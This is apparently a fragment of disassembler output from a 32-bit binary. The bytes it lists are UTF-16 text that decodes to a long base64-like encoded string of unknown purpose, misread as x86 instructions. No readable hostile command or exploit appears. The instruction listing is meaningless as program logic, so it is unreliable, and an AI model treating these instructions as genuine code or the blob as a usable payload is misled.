  40a1b1:	00 70 00             	add    %dh,0x0(%eax)
  40a1b4:	55                   	push   %ebp
  40a1b5:	00 37                	add    %dh,(%edi)
  40a1b7:	00 73 00             	add    %dh,0x0(%ebx)
  40a1ba:	34 00                	xor    $0x0,%al
  40a1bc:	38 00                	cmp    %al,(%eax)
  40a1be:	6a 00                	push   $0x0
  40a1c0:	76 00                	jbe    0x40a1c2
  40a1c2:	62 00                	bound  %eax,(%eax)
  40a1c4:	6a 00                	push   $0x0
  40a1c6:	49                   	dec    %ecx
  40a1c7:	00 58 00             	add    %bl,0x0(%eax)
  40a1ca:	6c                   	insb   (%dx),%es:(%edi)
  40a1cb:	00 77 00             	add    %dh,0x0(%edi)
  40a1ce:	34 00                	xor    $0x0,%al
  40a1d0:	4e                   	dec    %esi
  40a1d1:	00 46 00             	add    %al,0x0(%esi)
  40a1d4:	51                   	push   %ecx
  40a1d5:	00 56 00             	add    %dl,0x0(%esi)
  40a1d8:	31 00                	xor    %eax,(%eax)
  40a1da:	4c                   	dec    %esp
  40a1db:	00 69 00             	add    %ch,0x0(%ecx)
  40a1de:	50                   	push   %eax
  40a1df:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1e2:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a1e5:	00 48 00             	add    %cl,0x0(%eax)
  40a1e8:	74 00                	je     0x40a1ea
  40a1ea:	68 00 65 00 73       	push   $0x73006500
  40a1ef:	00 42 00             	add    %al,0x0(%edx)
  40a1f2:	38 00                	cmp    %al,(%eax)
  40a1f4:	57                   	push   %edi
  40a1f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a1f8:	31 00                	xor    %eax,(%eax)
  40a1fa:	6d                   	insl   (%dx),%es:(%edi)
  40a1fb:	00 39                	add    %bh,(%ecx)
  40a1fd:	00 47 00             	add    %al,0x0(%edi)
  40a200:	6f                   	outsl  %ds:(%esi),(%dx)
  40a201:	00 57 00             	add    %dl,0x0(%edi)
  40a204:	31 00                	xor    %eax,(%eax)
  40a206:	56                   	push   %esi
  40a207:	00 30                	add    %dh,(%eax)
  40a209:	00 6a 00             	add    %ch,0x0(%edx)
  40a20c:	5a                   	pop    %edx
  40a20d:	00 45 00             	add    %al,0x0(%ebp)
  40a210:	56                   	push   %esi
  40a211:	00 4a 00             	add    %cl,0x0(%edx)
  40a214:	56                   	push   %esi
  40a215:	00 76 00             	add    %dh,0x0(%esi)
  40a218:	70 00                	jo     0x40a21a
  40a21a:	48                   	dec    %eax
  40a21b:	00 4a 00             	add    %cl,0x0(%edx)
  40a21e:	4f                   	dec    %edi
  40a21f:	00 46 00             	add    %al,0x0(%esi)
  40a222:	75 00                	jne    0x40a224
  40a224:	6f                   	outsl  %ds:(%esi),(%dx)
  40a225:	00 58 00             	add    %bl,0x0(%eax)
  40a228:	41                   	inc    %ecx
  40a229:	00 62 00             	add    %ah,0x0(%edx)
  40a22c:	44                   	inc    %esp
  40a22d:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40a231:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a235:	00 6f 00             	add    %ch,0x0(%edi)
  40a238:	46                   	inc    %esi
  40a239:	00 77 00             	add    %dh,0x0(%edi)
  40a23c:	53                   	push   %ebx
  40a23d:	00 48 00             	add    %cl,0x0(%eax)
  40a240:	78 00                	js     0x40a242
  40a242:	79 00                	jns    0x40a244
  40a244:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a248:	54                   	push   %esp
  40a249:	00 4a 00             	add    %cl,0x0(%edx)
  40a24c:	47                   	inc    %edi
  40a24d:	00 2b                	add    %ch,(%ebx)
  40a24f:	00 6f 00             	add    %ch,0x0(%edi)
  40a252:	4f                   	dec    %edi
  40a253:	00 30                	add    %dh,(%eax)
  40a255:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40a259:	00 41 00             	add    %al,0x0(%ecx)
  40a25c:	75 00                	jne    0x40a25e
  40a25e:	48                   	dec    %eax
  40a25f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a262:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a266:	2f                   	das
  40a267:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40a26b:	00 56 00             	add    %dl,0x0(%esi)
  40a26e:	30 00                	xor    %al,(%eax)
  40a270:	35 00 4b 00 36       	xor    $0x36004b00,%eax
  40a275:	00 75 00             	add    %dh,0x0(%ebp)
  40a278:	2f                   	das
  40a279:	00 4f 00             	add    %cl,0x0(%edi)
  40a27c:	65 00 32             	add    %dh,%gs:(%edx)
  40a27f:	00 71 00             	add    %dh,0x0(%ecx)
  40a282:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40a286:	69 00 58 00 36 00    	imul   $0x360058,(%eax),%eax
  40a28c:	71 00                	jno    0x40a28e
  40a28e:	5a                   	pop    %edx
  40a28f:	00 67 00             	add    %ah,0x0(%edi)
  40a292:	53                   	push   %ebx
  40a293:	00 76 00             	add    %dh,0x0(%esi)
  40a296:	47                   	inc    %edi
  40a297:	00 6a 00             	add    %ch,0x0(%edx)
  40a29a:	4b                   	dec    %ebx
  40a29b:	00 37                	add    %dh,(%edi)
  40a29d:	00 73 00             	add    %dh,0x0(%ebx)
  40a2a0:	41                   	inc    %ecx
  40a2a1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2a4:	41                   	inc    %ecx
  40a2a5:	00 4e 00             	add    %cl,0x0(%esi)
  40a2a8:	62 00                	bound  %eax,(%eax)
  40a2aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2ab:	00 63 00             	add    %ah,0x0(%ebx)
  40a2ae:	56                   	push   %esi
  40a2af:	00 33                	add    %dh,(%ebx)
  40a2b1:	00 63 00             	add    %ah,0x0(%ebx)
  40a2b4:	4b                   	dec    %ebx
  40a2b5:	00 69 00             	add    %ch,0x0(%ecx)
  40a2b8:	4b                   	dec    %ebx
  40a2b9:	00 55 00             	add    %dl,0x0(%ebp)
  40a2bc:	37                   	aaa
  40a2bd:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40a2c1:	00 78 00             	add    %bh,0x0(%eax)
  40a2c4:	53                   	push   %ebx
  40a2c5:	00 62 00             	add    %ah,0x0(%edx)
  40a2c8:	62 00                	bound  %eax,(%eax)
  40a2ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2cb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2ce:	52                   	push   %edx
  40a2cf:	00 38                	add    %bh,(%eax)
  40a2d1:	00 31                	add    %dh,(%ecx)
  40a2d3:	00 48 00             	add    %cl,0x0(%eax)
  40a2d6:	4b                   	dec    %ebx
  40a2d7:	00 49 00             	add    %cl,0x0(%ecx)
  40a2da:	78 00                	js     0x40a2dc
  40a2dc:	73 00                	jae    0x40a2de
  40a2de:	37                   	aaa
  40a2df:	00 33                	add    %dh,(%ebx)
  40a2e1:	00 4f 00             	add    %cl,0x0(%edi)
  40a2e4:	6a 00                	push   $0x0
  40a2e6:	50                   	push   %eax
  40a2e7:	00 38                	add    %bh,(%eax)
  40a2e9:	00 7a 00             	add    %bh,0x0(%edx)
  40a2ec:	44                   	inc    %esp
  40a2ed:	00 61 00             	add    %ah,0x0(%ecx)
  40a2f0:	69 00 6f 00 6a 00    	imul   $0x6a006f,(%eax),%eax
  40a2f6:	43                   	inc    %ebx
  40a2f7:	00 38                	add    %bh,(%eax)
  40a2f9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2fc:	52                   	push   %edx
  40a2fd:	00 41 00             	add    %al,0x0(%ecx)
  40a300:	41                   	inc    %ecx
  40a301:	00 37                	add    %dh,(%edi)
  40a303:	00 55 00             	add    %dl,0x0(%ebp)
  40a306:	45                   	inc    %ebp
  40a307:	00 4a 00             	add    %cl,0x0(%edx)
  40a30a:	56                   	push   %esi
  40a30b:	00 55 00             	add    %dl,0x0(%ebp)
  40a30e:	79 00                	jns    0x40a310
  40a310:	77 00                	ja     0x40a312
  40a312:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a316:	78 00                	js     0x40a318
  40a318:	4e                   	dec    %esi
  40a319:	00 6b 00             	add    %ch,0x0(%ebx)
  40a31c:	4d                   	dec    %ebp
  40a31d:	00 55 00             	add    %dl,0x0(%ebp)
  40a320:	44                   	inc    %esp
  40a321:	00 77 00             	add    %dh,0x0(%edi)
  40a324:	73 00                	jae    0x40a326
  40a326:	54                   	push   %esp
  40a327:	00 55 00             	add    %dl,0x0(%ebp)
  40a32a:	45                   	inc    %ebp
  40a32b:	00 73 00             	add    %dh,0x0(%ebx)
  40a32e:	47                   	inc    %edi
  40a32f:	00 36                	add    %dh,(%esi)
  40a331:	00 30                	add    %dh,(%eax)
  40a333:	00 76 00             	add    %dh,0x0(%esi)
  40a336:	56                   	push   %esi
  40a337:	00 65 00             	add    %ah,0x0(%ebp)
  40a33a:	68 00 63 00 54       	push   $0x54006300
  40a33f:	00 38                	add    %bh,(%eax)
  40a341:	00 62 00             	add    %ah,0x0(%edx)
  40a344:	4f                   	dec    %edi
  40a345:	00 61 00             	add    %ah,0x0(%ecx)
  40a348:	6e                   	outsb  %ds:(%esi),(%dx)
  40a349:	00 46 00             	add    %al,0x0(%esi)
  40a34c:	78 00                	js     0x40a34e
  40a34e:	77 00                	ja     0x40a350
  40a350:	4a                   	dec    %edx
  40a351:	00 68 00             	add    %ch,0x0(%eax)
  40a354:	74 00                	je     0x40a356
  40a356:	36 00 35 00 78 00 56 	add    %dh,%ss:0x56007800
  40a35d:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a361:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a364:	73 00                	jae    0x40a366
  40a366:	45                   	inc    %ebp
  40a367:	00 71 00             	add    %dh,0x0(%ecx)
  40a36a:	76 00                	jbe    0x40a36c
  40a36c:	39 00                	cmp    %eax,(%eax)
  40a36e:	7a 00                	jp     0x40a370
  40a370:	74 00                	je     0x40a372
  40a372:	48                   	dec    %eax
  40a373:	00 4f 00             	add    %cl,0x0(%edi)
  40a376:	52                   	push   %edx
  40a377:	00 43 00             	add    %al,0x0(%ebx)
  40a37a:	72 00                	jb     0x40a37c
  40a37c:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40a380:	4a                   	dec    %edx
  40a381:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40a385:	00 76 00             	add    %dh,0x0(%esi)
  40a388:	57                   	push   %edi
  40a389:	00 75 00             	add    %dh,0x0(%ebp)
  40a38c:	54                   	push   %esp
  40a38d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a391:	00 7a 00             	add    %bh,0x0(%edx)
  40a394:	75 00                	jne    0x40a396
  40a396:	49                   	dec    %ecx
  40a397:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40a39b:	00 43 00             	add    %al,0x0(%ebx)
  40a39e:	4b                   	dec    %ebx
  40a39f:	00 53 00             	add    %dl,0x0(%ebx)
  40a3a2:	51                   	push   %ecx
  40a3a3:	00 6e 00             	add    %ch,0x0(%esi)
  40a3a6:	38 00                	cmp    %al,(%eax)
  40a3a8:	53                   	push   %ebx
  40a3a9:	00 38                	add    %bh,(%eax)
  40a3ab:	00 66 00             	add    %ah,0x0(%esi)
  40a3ae:	78 00                	js     0x40a3b0
  40a3b0:	4e                   	dec    %esi
  40a3b1:	00 79 00             	add    %bh,0x0(%ecx)
  40a3b4:	69 00 66 00 62 00    	imul   $0x620066,(%eax),%eax
  40a3ba:	6a 00                	push   $0x0
  40a3bc:	46                   	inc    %esi
  40a3bd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3c0:	58                   	pop    %eax
  40a3c1:	00 78 00             	add    %bh,0x0(%eax)
  40a3c4:	44                   	inc    %esp
  40a3c5:	00 79 00             	add    %bh,0x0(%ecx)
  40a3c8:	65 00 31             	add    %dh,%gs:(%ecx)
  40a3cb:	00 71 00             	add    %dh,0x0(%ecx)
  40a3ce:	67 00 31             	add    %dh,(%bx,%di)
  40a3d1:	00 73 00             	add    %dh,0x0(%ebx)
  40a3d4:	52                   	push   %edx
  40a3d5:	00 69 00             	add    %ch,0x0(%ecx)
  40a3d8:	6c                   	insb   (%dx),%es:(%edi)
  40a3d9:	00 76 00             	add    %dh,0x0(%esi)
  40a3dc:	32 00                	xor    (%eax),%al
  40a3de:	78 00                	js     0x40a3e0
  40a3e0:	39 00                	cmp    %eax,(%eax)
  40a3e2:	30 00                	xor    %al,(%eax)
  40a3e4:	48                   	dec    %eax
  40a3e5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3e8:	42                   	inc    %edx
  40a3e9:	00 2b                	add    %ch,(%ebx)
  40a3eb:	00 41 00             	add    %al,0x0(%ecx)
  40a3ee:	48                   	dec    %eax
  40a3ef:	00 30                	add    %dh,(%eax)
  40a3f1:	00 51 00             	add    %dl,0x0(%ecx)
  40a3f4:	55                   	push   %ebp
  40a3f5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3f8:	4c                   	dec    %esp
  40a3f9:	00 47 00             	add    %al,0x0(%edi)
  40a3fc:	71 00                	jno    0x40a3fe
  40a3fe:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3ff:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a402:	2b 00                	sub    (%eax),%eax
  40a404:	46                   	inc    %esi
  40a405:	00 68 00             	add    %ch,0x0(%eax)
  40a408:	4e                   	dec    %esi
  40a409:	00 56 00             	add    %dl,0x0(%esi)
  40a40c:	73 00                	jae    0x40a40e
  40a40e:	6d                   	insl   (%dx),%es:(%edi)
  40a40f:	00 68 00             	add    %ch,0x0(%eax)
  40a412:	54                   	push   %esp
  40a413:	00 30                	add    %dh,(%eax)
  40a415:	00 57 00             	add    %dl,0x0(%edi)
  40a418:	72 00                	jb     0x40a41a
  40a41a:	57                   	push   %edi
  40a41b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a41e:	2b 00                	sub    (%eax),%eax
  40a420:	78 00                	js     0x40a422
  40a422:	53                   	push   %ebx
  40a423:	00 49 00             	add    %cl,0x0(%ecx)
  40a426:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a42a:	5a                   	pop    %edx
  40a42b:	00 43 00             	add    %al,0x0(%ebx)
  40a42e:	75 00                	jne    0x40a430
  40a430:	32 00                	xor    (%eax),%al
  40a432:	31 00                	xor    %eax,(%eax)
  40a434:	51                   	push   %ecx
  40a435:	00 71 00             	add    %dh,0x0(%ecx)
  40a438:	4d                   	dec    %ebp
  40a439:	00 46 00             	add    %al,0x0(%esi)
  40a43c:	76 00                	jbe    0x40a43e
  40a43e:	4e                   	dec    %esi
  40a43f:	00 48 00             	add    %cl,0x0(%eax)
  40a442:	4e                   	dec    %esi
  40a443:	00 50 00             	add    %dl,0x0(%eax)
  40a446:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a449:	00 70 00             	add    %dh,0x0(%eax)
  40a44c:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a450:	4d                   	dec    %ebp
  40a451:	00 6a 00             	add    %ch,0x0(%edx)
  40a454:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40a458:	71 00                	jno    0x40a45a
  40a45a:	45                   	inc    %ebp
  40a45b:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a45f:	00 33                	add    %dh,(%ebx)
  40a461:	00 31                	add    %dh,(%ecx)
  40a463:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40a467:	00 78 00             	add    %bh,0x0(%eax)
  40a46a:	42                   	inc    %edx
  40a46b:	00 6a 00             	add    %ch,0x0(%edx)
  40a46e:	59                   	pop    %ecx
  40a46f:	00 71 00             	add    %dh,0x0(%ecx)
  40a472:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40a476:	41                   	inc    %ecx
  40a477:	00 69 00             	add    %ch,0x0(%ecx)
  40a47a:	4d                   	dec    %ebp
  40a47b:	00 65 00             	add    %ah,0x0(%ebp)
  40a47e:	4e                   	dec    %esi
  40a47f:	00 53 00             	add    %dl,0x0(%ebx)
  40a482:	32 00                	xor    (%eax),%al
  40a484:	42                   	inc    %edx
  40a485:	00 56 00             	add    %dl,0x0(%esi)
  40a488:	79 00                	jns    0x40a48a
  40a48a:	50                   	push   %eax
  40a48b:	00 47 00             	add    %al,0x0(%edi)
  40a48e:	35 00 77 00 7a       	xor    $0x7a007700,%eax
  40a493:	00 55 00             	add    %dl,0x0(%ebp)
  40a496:	31 00                	xor    %eax,(%eax)
  40a498:	6b 00 64             	imul   $0x64,(%eax),%eax
  40a49b:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a49f:	00 56 00             	add    %dl,0x0(%esi)
  40a4a2:	77 00                	ja     0x40a4a4
  40a4a4:	78 00                	js     0x40a4a6
  40a4a6:	4a                   	dec    %edx
  40a4a7:	00 75 00             	add    %dh,0x0(%ebp)
  40a4aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4ab:	00 55 00             	add    %dl,0x0(%ebp)
  40a4ae:	4b                   	dec    %ebx
  40a4af:	00 71 00             	add    %dh,0x0(%ecx)
  40a4b2:	68 00 5a 00 57       	push   $0x57005a00
  40a4b7:	00 53 00             	add    %dl,0x0(%ebx)
  40a4ba:	61                   	popa
  40a4bb:	00 2f                	add    %ch,(%edi)
  40a4bd:	00 32                	add    %dh,(%edx)
  40a4bf:	00 58 00             	add    %bl,0x0(%eax)
  40a4c2:	39 00                	cmp    %eax,(%eax)
  40a4c4:	68 00 4a 00 37       	push   $0x37004a00
  40a4c9:	00 45 00             	add    %al,0x0(%ebp)
  40a4cc:	37                   	aaa
  40a4cd:	00 6e 00             	add    %ch,0x0(%esi)
  40a4d0:	4d                   	dec    %ebp
  40a4d1:	00 71 00             	add    %dh,0x0(%ecx)
  40a4d4:	38 00                	cmp    %al,(%eax)
  40a4d6:	75 00                	jne    0x40a4d8
  40a4d8:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40a4dc:	76 00                	jbe    0x40a4de
  40a4de:	58                   	pop    %eax
  40a4df:	00 67 00             	add    %ah,0x0(%edi)
  40a4e2:	73 00                	jae    0x40a4e4
  40a4e4:	5a                   	pop    %edx
  40a4e5:	00 53 00             	add    %dl,0x0(%ebx)
  40a4e8:	42                   	inc    %edx
  40a4e9:	00 48 00             	add    %cl,0x0(%eax)
  40a4ec:	62 00                	bound  %eax,(%eax)
  40a4ee:	70 00                	jo     0x40a4f0
  40a4f0:	6d                   	insl   (%dx),%es:(%edi)
  40a4f1:	00 37                	add    %dh,(%edi)
  40a4f3:	00 49 00             	add    %cl,0x0(%ecx)
  40a4f6:	54                   	push   %esp
  40a4f7:	00 41 00             	add    %al,0x0(%ecx)
  40a4fa:	72 00                	jb     0x40a4fc
  40a4fc:	73 00                	jae    0x40a4fe
  40a4fe:	2f                   	das
  40a4ff:	00 4b 00             	add    %cl,0x0(%ebx)
  40a502:	39 00                	cmp    %eax,(%eax)
  40a504:	49                   	dec    %ecx
  40a505:	00 52 00             	add    %dl,0x0(%edx)
  40a508:	5a                   	pop    %edx
  40a509:	00 33                	add    %dh,(%ebx)
  40a50b:	00 6f 00             	add    %ch,0x0(%edi)
  40a50e:	56                   	push   %esi
  40a50f:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a513:	00 72 00             	add    %dh,0x0(%edx)
  40a516:	52                   	push   %edx
  40a517:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40a51b:	00 72 00             	add    %dh,0x0(%edx)
  40a51e:	4b                   	dec    %ebx
  40a51f:	00 6a 00             	add    %ch,0x0(%edx)
  40a522:	6a 00                	push   $0x0
  40a524:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a528:	76 00                	jbe    0x40a52a
  40a52a:	56                   	push   %esi
  40a52b:	00 59 00             	add    %bl,0x0(%ecx)
  40a52e:	4a                   	dec    %edx
  40a52f:	00 76 00             	add    %dh,0x0(%esi)
  40a532:	51                   	push   %ecx
  40a533:	00 61 00             	add    %ah,0x0(%ecx)
  40a536:	55                   	push   %ebp
  40a537:	00 6f 00             	add    %ch,0x0(%edi)
  40a53a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a53b:	00 49 00             	add    %cl,0x0(%ecx)
  40a53e:	4d                   	dec    %ebp
  40a53f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a542:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40a546:	58                   	pop    %eax
  40a547:	00 79 00             	add    %bh,0x0(%ecx)
  40a54a:	50                   	push   %eax
  40a54b:	00 52 00             	add    %dl,0x0(%edx)
  40a54e:	50                   	push   %eax
  40a54f:	00 62 00             	add    %ah,0x0(%edx)
  40a552:	42                   	inc    %edx
  40a553:	00 75 00             	add    %dh,0x0(%ebp)
  40a556:	6a 00                	push   $0x0
  40a558:	76 00                	jbe    0x40a55a
  40a55a:	35 00 56 00 4c       	xor    $0x4c005600,%eax
  40a55f:	00 2f                	add    %ch,(%edi)
  40a561:	00 61 00             	add    %ah,0x0(%ecx)
  40a564:	62 00                	bound  %eax,(%eax)
  40a566:	4b                   	dec    %ebx
  40a567:	00 53 00             	add    %dl,0x0(%ebx)
  40a56a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a56b:	00 47 00             	add    %al,0x0(%edi)
  40a56e:	2b 00                	sub    (%eax),%eax
  40a570:	69 00 39 00 38 00    	imul   $0x380039,(%eax),%eax
  40a576:	2f                   	das
  40a577:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40a57b:	00 55 00             	add    %dl,0x0(%ebp)
  40a57e:	61                   	popa
  40a57f:	00 6f 00             	add    %ch,0x0(%edi)
  40a582:	59                   	pop    %ecx
  40a583:	00 52 00             	add    %dl,0x0(%edx)
  40a586:	72 00                	jb     0x40a588
  40a588:	33 00                	xor    (%eax),%eax
  40a58a:	76 00                	jbe    0x40a58c
  40a58c:	6a 00                	push   $0x0
  40a58e:	34 00                	xor    $0x0,%al
  40a590:	4c                   	dec    %esp
  40a591:	00 42 00             	add    %al,0x0(%edx)
  40a594:	69 00 42 00 4a 00    	imul   $0x4a0042,(%eax),%eax
  40a59a:	46                   	inc    %esi
  40a59b:	00 59 00             	add    %bl,0x0(%ecx)
  40a59e:	48                   	dec    %eax
  40a59f:	00 35 00 4c 00 50    	add    %dh,0x50004c00
  40a5a5:	00 6f 00             	add    %ch,0x0(%edi)
  40a5a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5a9:	00 57 00             	add    %dl,0x0(%edi)
  40a5ac:	69 00 43 00 59 00    	imul   $0x590043,(%eax),%eax
  40a5b2:	66 00 74 00 67       	data16 add %dh,0x67(%eax,%eax,1)
  40a5b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ba:	6c                   	insb   (%dx),%es:(%edi)
  40a5bb:	00 36                	add    %dh,(%esi)
  40a5bd:	00 38                	add    %bh,(%eax)
  40a5bf:	00 4a 00             	add    %cl,0x0(%edx)
  40a5c2:	71 00                	jno    0x40a5c4
  40a5c4:	58                   	pop    %eax
  40a5c5:	00 63 00             	add    %ah,0x0(%ebx)
  40a5c8:	68 00 63 00 53       	push   $0x53006300
  40a5cd:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a5d1:	00 57 00             	add    %dl,0x0(%edi)
  40a5d4:	41                   	inc    %ecx
  40a5d5:	00 56 00             	add    %dl,0x0(%esi)
  40a5d8:	4d                   	dec    %ebp
  40a5d9:	00 4a 00             	add    %cl,0x0(%edx)
  40a5dc:	36 00 36             	add    %dh,%ss:(%esi)
  40a5df:	00 48 00             	add    %cl,0x0(%eax)
  40a5e2:	35 00 63 00 6f       	xor    $0x6f006300,%eax
  40a5e7:	00 35 00 46 00 55    	add    %dh,0x55004600
  40a5ed:	00 52 00             	add    %dl,0x0(%edx)
  40a5f0:	49                   	dec    %ecx
  40a5f1:	00 7a 00             	add    %bh,0x0(%edx)
  40a5f4:	4a                   	dec    %edx
  40a5f5:	00 78 00             	add    %bh,0x0(%eax)
  40a5f8:	31 00                	xor    %eax,(%eax)
  40a5fa:	5a                   	pop    %edx
  40a5fb:	00 4f 00             	add    %cl,0x0(%edi)
  40a5fe:	70 00                	jo     0x40a600
  40a600:	77 00                	ja     0x40a602
  40a602:	55                   	push   %ebp
  40a603:	00 58 00             	add    %bl,0x0(%eax)
  40a606:	54                   	push   %esp
  40a607:	00 55 00             	add    %dl,0x0(%ebp)
  40a60a:	4f                   	dec    %edi
  40a60b:	00 45 00             	add    %al,0x0(%ebp)
  40a60e:	46                   	inc    %esi
  40a60f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a612:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a616:	4e                   	dec    %esi
  40a617:	00 76 00             	add    %dh,0x0(%esi)
  40a61a:	56                   	push   %esi
  40a61b:	00 69 00             	add    %ch,0x0(%ecx)
  40a61e:	76 00                	jbe    0x40a620
  40a620:	43                   	inc    %ebx
  40a621:	00 56 00             	add    %dl,0x0(%esi)
  40a624:	68 00 63 00 74       	push   $0x74006300
  40a629:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a62d:	00 73 00             	add    %dh,0x0(%ebx)
  40a630:	76 00                	jbe    0x40a632
  40a632:	54                   	push   %esp
  40a633:	00 36                	add    %dh,(%esi)
  40a635:	00 70 00             	add    %dh,0x0(%eax)
  40a638:	71 00                	jno    0x40a63a
  40a63a:	55                   	push   %ebp
  40a63b:	00 5a 00             	add    %bl,0x0(%edx)
  40a63e:	37                   	aaa
  40a63f:	00 53 00             	add    %dl,0x0(%ebx)
  40a642:	47                   	inc    %edi
  40a643:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40a647:	00 32                	add    %dh,(%edx)
  40a649:	00 48 00             	add    %cl,0x0(%eax)
  40a64c:	56                   	push   %esi
  40a64d:	00 35 00 76 00 38    	add    %dh,0x38007600
  40a653:	00 7a 00             	add    %bh,0x0(%edx)
  40a656:	70 00                	jo     0x40a658
  40a658:	6d                   	insl   (%dx),%es:(%edi)
  40a659:	00 6b 00             	add    %ch,0x0(%ebx)
  40a65c:	4f                   	dec    %edi
  40a65d:	00 79 00             	add    %bh,0x0(%ecx)
  40a660:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40a664:	54                   	push   %esp
  40a665:	00 6a 00             	add    %ch,0x0(%edx)
  40a668:	32 00                	xor    (%eax),%al
  40a66a:	55                   	push   %ebp
  40a66b:	00 30                	add    %dh,(%eax)
  40a66d:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40a671:	00 76 00             	add    %dh,0x0(%esi)
  40a674:	52                   	push   %edx
  40a675:	00 4b 00             	add    %cl,0x0(%ebx)
  40a678:	41                   	inc    %ecx
  40a679:	00 55 00             	add    %dl,0x0(%ebp)
  40a67c:	61                   	popa
  40a67d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a680:	75 00                	jne    0x40a682
  40a682:	4b                   	dec    %ebx
  40a683:	00 68 00             	add    %ch,0x0(%eax)
  40a686:	43                   	inc    %ebx
  40a687:	00 6e 00             	add    %ch,0x0(%esi)
  40a68a:	4a                   	dec    %edx
  40a68b:	00 32                	add    %dh,(%edx)
  40a68d:	00 61 00             	add    %ah,0x0(%ecx)
  40a690:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40a694:	35 00 50 00 55       	xor    $0x55005000,%eax
  40a699:	00 2b                	add    %ch,(%ebx)
  40a69b:	00 32                	add    %dh,(%edx)
  40a69d:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a6a1:	00 66 00             	add    %ah,0x0(%esi)
  40a6a4:	70 00                	jo     0x40a6a6
  40a6a6:	59                   	pop    %ecx
  40a6a7:	00 4e 00             	add    %cl,0x0(%esi)
  40a6aa:	63 00                	arpl   %eax,(%eax)
  40a6ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6ad:	00 76 00             	add    %dh,0x0(%esi)
  40a6b0:	72 00                	jb     0x40a6b2
  40a6b2:	47                   	inc    %edi
  40a6b3:	00 38                	add    %bh,(%eax)
  40a6b5:	00 56 00             	add    %dl,0x0(%esi)
  40a6b8:	4f                   	dec    %edi
  40a6b9:	00 70 00             	add    %dh,0x0(%eax)
  40a6bc:	54                   	push   %esp
  40a6bd:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40a6c1:	00 70 00             	add    %dh,0x0(%eax)
  40a6c4:	43                   	inc    %ebx
  40a6c5:	00 65 00             	add    %ah,0x0(%ebp)
  40a6c8:	46                   	inc    %esi
  40a6c9:	00 58 00             	add    %bl,0x0(%eax)
  40a6cc:	37                   	aaa
  40a6cd:	00 45 00             	add    %al,0x0(%ebp)
  40a6d0:	6c                   	insb   (%dx),%es:(%edi)
  40a6d1:	00 69 00             	add    %ch,0x0(%ecx)
  40a6d4:	77 00                	ja     0x40a6d6
  40a6d6:	55                   	push   %ebp
  40a6d7:	00 31                	add    %dh,(%ecx)
  40a6d9:	00 76 00             	add    %dh,0x0(%esi)
  40a6dc:	41                   	inc    %ecx
  40a6dd:	00 66 00             	add    %ah,0x0(%esi)
  40a6e0:	2f                   	das
  40a6e1:	00 41 00             	add    %al,0x0(%ecx)
  40a6e4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6e5:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a6e9:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40a6ed:	00 50 00             	add    %dl,0x0(%eax)
  40a6f0:	78 00                	js     0x40a6f2
  40a6f2:	49                   	dec    %ecx
  40a6f3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6f6:	75 00                	jne    0x40a6f8
